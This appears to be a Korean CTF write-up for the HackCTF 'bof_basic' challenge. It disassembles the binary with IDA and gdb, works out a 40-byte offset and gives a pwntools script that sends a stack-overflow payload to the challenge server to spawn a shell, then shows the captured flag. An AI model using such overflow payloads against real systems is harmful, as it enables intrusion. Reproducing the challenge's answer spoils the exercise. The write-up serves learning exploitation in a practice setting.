@@ -1,0 +1,409 @@
+1. 문제를 열고 파일을 IDA 를 이용해서 C로 바꾸자.
+
+
+어셈블리
+
+; Attributes: bp-based frame
+
+public main
+main proc near
+
+s= byte ptr -34h
+var_C= dword ptr -0Ch
+var_4= dword ptr -4
+
+lea     ecx, [esp+4]
+and     esp, 0FFFFFFF0h
+push    dword ptr [ecx-4]
+push    ebp
+mov     ebp, esp
+push    ecx
+sub     esp, 34h
+mov     [ebp+var_C], 4030201h
+mov     eax, ds:stdin@@GLIBC_2_0
+sub     esp, 4
+push    eax             ; stream
+push    2Dh             ; n
+lea     eax, [ebp+s]
+push    eax             ; s
+call    _fgets
+add     esp, 10h
+sub     esp, 8
+lea     eax, [ebp+s]
+push    eax
+push    offset format   ; "\n[buf]: %s\n"
+call    _printf
+add     esp, 10h
+sub     esp, 8
+push    [ebp+var_C]
+push    offset aCheckP  ; "[check] %p\n"
+call    _printf
+add     esp, 10h
+cmp     [ebp+var_C], 4030201h
+jz      short loc_8048543
+
+
+cmp     [ebp+var_C], 0DEADBEEFh
+jz      short loc_8048543
+
+
+sub     esp, 0Ch
+push    offset s        ; "\nYou are on the right way!"
+call    _puts
+add     esp, 10h
+
+
+loc_8048543:
+cmp     [ebp+var_C], 0DEADBEEFh
+jnz     short loc_804857C
+
+
+sub     esp, 0Ch
+push    offset aYeahDudeYouWin ; "Yeah dude! You win!\nOpening your shell."...
+call    _puts
+add     esp, 10h
+sub     esp, 0Ch
+push    offset command  ; "/bin/dash"
+call    _system
+add     esp, 10h
+sub     esp, 0Ch
+push    offset aShellClosedBye ; "Shell closed! Bye."
+call    _puts
+add     esp, 10h
+
+
+loc_804857C:
+mov     eax, 0
+mov     ecx, [ebp+var_4]
+leave
+lea     esp, [ecx-4]
+retn
+main endp
+
+
+
+
+
+
+
+C언어
+
+
+int __cdecl main()
+{
+  char s; // [sp+4h] [bp-34h]@1
+  int v2; // [sp+2Ch] [bp-Ch]@1
+
+  v2 = 67305985;
+  fgets(&s, 45, stdin);
+  printf("\n[buf]: %s\n", &s);
+  printf("[check] %p\n", v2);
+  if ( v2 != 67305985 && v2 != -559038737 )
+    puts("\nYou are on the right way!");
+  if ( v2 == -559038737 )
+  {
+    puts("Yeah dude! You win!\nOpening your shell...");
+    system("/bin/dash");
+    puts("Shell closed! Bye.");
+  }
+  return 0;
+}
+
+
+
+gdb -q 를 해서 한번 열어보자
+
+
+
+0x080484cb <+0>:    lea    0x4(%esp),%ecx
+   0x080484cf <+4>:    and    $0xfffffff0,%esp
+   0x080484d2 <+7>:    pushl  -0x4(%ecx)
+   0x080484d5 <+10>:    push   %ebp
+   0x080484d6 <+11>:    mov    %esp,%ebp
+   0x080484d8 <+13>:    push   %ecx
+   0x080484d9 <+14>:    sub    $0x34,%esp
+   0x080484dc <+17>:    movl   $0x4030201,-0xc(%ebp)
+   0x080484e3 <+24>:    mov    0x804a040,%eax
+   0x080484e8 <+29>:    sub    $0x4,%esp
+   0x080484eb <+32>:    push   %eax
+   0x080484ec <+33>:    push   $0x2d
+   0x080484ee <+35>:    lea    -0x34(%ebp),%eax
+   0x080484f1 <+38>:    push   %eax
+   0x080484f2 <+39>:    call   0x8048380 <fgets@plt---Type <return> to continue, or q <return> to quit---
+>
+   0x080484f7 <+44>:    add    $0x10,%esp
+   0x080484fa <+47>:    sub    $0x8,%esp
+   0x080484fd <+50>:    lea    -0x34(%ebp),%eax
+   0x08048500 <+53>:    push   %eax
+   0x08048501 <+54>:    push   $0x8048610
+   0x08048506 <+59>:    call   0x8048370 <printf@plt>
+   0x0804850b <+64>:    add    $0x10,%esp
+   0x0804850e <+67>:    sub    $0x8,%esp
+   0x08048511 <+70>:    pushl  -0xc(%ebp)
+   0x08048514 <+73>:    push   $0x804861c
+   0x08048519 <+78>:    call   0x8048370 <printf@plt>
+   0x0804851e <+83>:    add    $0x10,%esp
+   0x08048521 <+86>:    cmpl   $0x4030201,-0xc(%ebp)
+---Type <return> to continue, or q <return> to quit---
+   0x08048528 <+93>:    je     0x8048543 <main+120>
+   0x0804852a <+95>:    cmpl   $0xdeadbeef,-0xc(%ebp)
+   0x08048531 <+102>:    je     0x8048543 <main+120>
+   0x08048533 <+104>:    sub    $0xc,%esp
+   0x08048536 <+107>:    push   $0x8048628
+   0x0804853b <+112>:    call   0x8048390 <puts@plt>
+   0x08048540 <+117>:    add    $0x10,%esp
+   0x08048543 <+120>:    cmpl   $0xdeadbeef,-0xc(%ebp)
+   0x0804854a <+127>:    jne    0x804857c <main+177>
+   0x0804854c <+129>:    sub    $0xc,%esp
+   0x0804854f <+132>:    push   $0x8048644
+---Type <return> to continue, or q <return> to quit---
+   0x08048554 <+137>:    call   0x8048390 <puts@plt>
+   0x08048559 <+142>:    add    $0x10,%esp
+   0x0804855c <+145>:    sub    $0xc,%esp
+   0x0804855f <+148>:    push   $0x804866e
+   0x08048564 <+153>:    call   0x80483a0 <system@plt>
+   0x08048569 <+158>:    add    $0x10,%esp
+   0x0804856c <+161>:    sub    $0xc,%esp
+   0x0804856f <+164>:    push   $0x8048678
+   0x08048574 <+169>:    call   0x8048390 <puts@plt>
+   0x08048579 <+174>:    add    $0x10,%esp
+   0x0804857c <+177>:    mov    $0x0,%eax
+   0x08048581 <+182>:    mov    -0x4(%ebp),%ecx
+   0x08048584 <+185>:    leave 
+   0x08048585 <+186>:    lea    -0x4(%ecx),%esp 
+
+
+
+버퍼는 0x34 - 0xC = 0x28
+
+따라서 페이로드 == 0x28 + ret주소 + 1byte(공백)
+
+
+
+
+이제 다시한번  gdb로 분석해보자
+
+
+gdb -q bof_basic
+
+Reading symbols from bof_basic...(no debugging symbols found)...done.
+(gdb)
+(gdb) set disassembly-flavor intel
+(gdb) disas main
+Dump of assembler code for function main:
+   0x080484cb <+0>:    lea    ecx,[esp+0x4]
+   0x080484cf <+4>:    and    esp,0xfffffff0
+   0x080484d2 <+7>:    push   DWORD PTR [ecx-0x4]
+   0x080484d5 <+10>:    push   ebp
+   0x080484d6 <+11>:    mov    ebp,esp
+   0x080484d8 <+13>:    push   ecx
+   0x080484d9 <+14>:    sub    esp,0x34
+   0x080484dc <+17>:    mov    DWORD PTR [ebp-0xc],0x4030201
+   0x080484e3 <+24>:    mov    eax,ds:0x804a040
+   0x080484e8 <+29>:    sub    esp,0x4
+   0x080484eb <+32>:    push   eax
+   0x080484ec <+33>:    push   0x2d
+   0x080484ee <+35>:    lea    eax,[ebp-0x34]
+   0x080484f1 <+38>:    push   eax
+   0x080484f2 <+39>:    call   0x8048380 <fgets@plt---Type <return> to continue, or q <return> to quit---
+>
+   0x080484f7 <+44>:    add    esp,0x10
+   0x080484fa <+47>:    sub    esp,0x8
+   0x080484fd <+50>:    lea    eax,[ebp-0x34]
+   0x08048500 <+53>:    push   eax
+   0x08048501 <+54>:    push   0x8048610
+   0x08048506 <+59>:    call   0x8048370 <printf@plt>
+   0x0804850b <+64>:    add    esp,0x10
+   0x0804850e <+67>:    sub    esp,0x8
+   0x08048511 <+70>:    push   DWORD PTR [ebp-0xc]
+   0x08048514 <+73>:    push   0x804861c
+   0x08048519 <+78>:    call   0x8048370 <printf@plt>
+   0x0804851e <+83>:    add    esp,0x10
+---Type <return> to continue, or q <return> to quit---030201
+   0x08048528 <+93>:    je     0x8048543 <main+120>
+   0x0804852a <+95>:    cmp    DWORD PTR [ebp-0xc],0xdeadbeef
+   0x08048531 <+102>:    je     0x8048543 <main+120>
+   0x08048533 <+104>:    sub    esp,0xc
+   0x08048536 <+107>:    push   0x8048628
+   0x0804853b <+112>:    call   0x8048390 <puts@plt>
+   0x08048540 <+117>:    add    esp,0x10
+   0x08048543 <+120>:    cmp    DWORD PTR [ebp-0xc],0xdeadbeef
+   0x0804854a <+127>:    jne    0x804857c <main+177>
+   0x0804854c <+129>:    sub    esp,0xc
+   0x0804854f <+132>:    push   0x8048644
+   0x08048554 <+137>:    call   0x8048390 <puts@plt>
+   0x08048559 <+142>:    add    esp,0x10
+   0x0804855c <+145>:    sub    esp,0xc
+   0x0804855f <+148>:    push   0x804866e
+   0x08048564 <+153>:    call   0x80483a0 <system@plt>
+   0x08048569 <+158>:    add    esp,0x10
+   0x0804856c <+161>:    sub    esp,0xc
+   0x0804856f <+164>:    push   0x8048678
+   0x08048574 <+169>:    call   0x8048390 <puts@plt>
+   0x08048579 <+174>:    add    esp,0x10
+---Type <return> to continue, or q <return> to quit---
+   0x0804857c <+177>:    mov    eax,0x0
+   0x08048581 <+182>:    mov    ecx,DWORD PTR [ebp-0x4]
+   0x08048584 <+185>:    leave 
+   0x08048585 <+186>:    lea    esp,[ecx-0x4]
+   0x08048588 <+189>:    ret   
+End of assembler dump.
+(gdb)
+(gdb) b*main+35
+Breakpoint 1 at 0x80484ee
+(gdb) r `python -c 'print "A"*40 + "\xef\be\xad\xde"'`
+Starting program: /home/choi/Downloads/bof_basic `python -c 'print "A"*40 + "\xef\be\xad\xde"'`
+
+Breakpoint 1, 0x080484ee in main () 
+
+ 
+
+여기서 0x080484f2 <+39>:    call   0x8048380 <fgets> 으로 푸는 방식인것을 알수있다.
+따라서 조건인 0xdeadbeef 를 넣어주고  버퍼 0x28 == 40 을 넣어주고 돌려준다.
+ 
+
+ 
+
+ 
+
+ 
+
+@@@@@@@@@@@@@
+
+ 
+
+0xffffd284:    0x0000000f    0xffffd2ab    0x00000000    0x00000000
+0xffffd294:    0x00000000    0xb0000000    0x94adac7e    0xea4d766f
+0xffffd2a4:    0x07ede23f    0x6950053a    0x00363836    0x6f682f00
+0xffffd2b4:    0x632f656d    0x2f696f68    0x6e776f44    0x64616f6c
+0xffffd2c4:    0x6f622f73    0x61625f66    0x00636973    0x41414141
+0xffffd2d4:    0x41414141    0x41414141    0x41414141    0x41414141
+0xffffd2e4:    0x41414141    0x41414141    0x41414141    0x41414141
+0xffffd2f4:    0x41414141    0xad6508ef    0x4c4300de    0x45545455
+0xffffd304:    0x4d495f52    0x444f4d5f    0x3d454c55    0x006d6978
+0xffffd314:    0x435f534c    0x524f4c4f    0x73723d53    0x643a303d
+0xffffd324:    0x31303d69    0x3a34333b    0x303d6e6c
+
+ 
+
+ 그러면 일정 반복구간이 나오는데 잘 적용됬다는 뜻이므로 0xdeadbeef 그대로 넣어도 될거같다.
+
+ 
+
+ 
+
+@@@@@@@@
+
+소스 코드
+ 
+
+cat bof_basic.py
+
+
+from pwn import *
+
+p = remote("ctf.j0n9hyun.xyz",3000)
+
+pay = 'A'*40 + p32(0xdeadbeef)
+
+
+
+p.sendline(pay)
+p.interactive() 
+
+ 
+
+ 그리고이제 대입코드가 성공하면 본래 우리가 획득하려했던 쉘을 획득해야하는데
+그 이름이 ctf.j0n9hyun.xyz 포트 번호 3000 이것을 우리가 접속하려는 코드를 짜본다.
+
+(앞으로 잘 이용해야할것 같으니까 기억해두자)
+
+pwntools 를 사용한다.
+
+p에는 remote 함수를 사용해서 접속하고자하는곳과 포트넘버를 입력하고
+
+pay에는 페이로드를 작성한다.
+
+
+
+
+@@@@@@@@@@@@@@@@@@@@@@
+
+packing 함수
+
+
+
+- p32(value) : 32bit 리틀 엔디안 방식으로 패킹
+
+
+
+1. p32(ABCD) = \x68\x67\x66\x65
+
+2. p32(0x804832c) = \x2c\x83\x04\x08
+
+
+
+- p64(value) : 64bit 리틀 엔디안 방식으로 패킹
+
+
+참조
+
+https://hanaldo.tistory.com/3 
+
+ 
+
+@@@@@@@@@@@@@@@2
+
+ 
+
+(python -c 'print "A"*40+"\xef\xbe\xad\xde"';cat)|./bof_basic
+
+[buf]: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAㄽ
+[check] 0xdeadbeef
+Yeah dude! You win!
+Opening your shell...
+ls
+Python-3.7.8      bof_basic    bof_basic.py
+Python-3.7.8.tgz  bof_basic.1  index.html
+
+그리고 이제 우리가 알아냈던 공격방법으로 우리가 받은 임시파일에 공격한다.
+
+버퍼 + 0xdeadbeef 를 fget 방식으로 공격하면 위처럼 공격이 성공해서 쉘을 획득할수있다.
+
+이방법으로 똑같이 위에 코드내용에서 페이로드와 연결할곳을 적고  
+
+bof_basic.py을 만들면 된다.
+
+ 
+
+ 
+
+@@@@@@@@@@@@@@@@@@@@@ 
+
+ 
+
+python bof_basic.py
+
+[+] Opening connection to ctf.j0n9hyun.xyz on port 3000: Done
+[*] Switching to interactive mode
+$ ls
+flag
+main
+$ cat flag
+HackCTF{f1r57_574ck_buff3r_0v3rfl0w_5ucc355}
+
+
+그리고 만든 파일을 python 기능을 사용해서  컴파일 해주면 그 해당 쉘과 연결이된다.
+
+그리고 코드내용대로 권한을 획득해서 ls를 해 파일 목록을보면 flag라는 파일이 있는데
+cat flag를 해주면 코드내용 즉 해당 CTF 답(플래그)을 얻을수있다.
+
+
+ 
+
+ 
+
+ 
+
+
+
